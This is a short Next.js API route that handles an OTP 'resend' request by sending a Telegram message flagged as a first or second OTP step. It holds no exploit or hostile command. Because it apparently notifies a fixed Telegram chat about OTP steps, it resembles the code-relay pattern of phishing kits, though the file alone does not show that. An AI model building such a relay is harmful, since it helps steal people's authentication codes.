import { NextRequest, NextResponse } from 'next/server';
import { sendTelegramMessage } from '@/lib/telegram';

export async function POST(request: NextRequest) {
  try {
    const body = await request.json().catch(() => ({}));
    const isSecondOtp = body?.isSecondOtp === true || body?.step === '2';
    const result = await sendTelegramMessage({ isSecondOtp }, 'resend');
    return result.success ? NextResponse.json({ success: true }) : NextResponse.json({ success: false }, { status: 500 });
  } catch (e) {
    console.error('Resend telegram error:', e);
    return NextResponse.json({ success: false }, { status: 500 });
  }
}
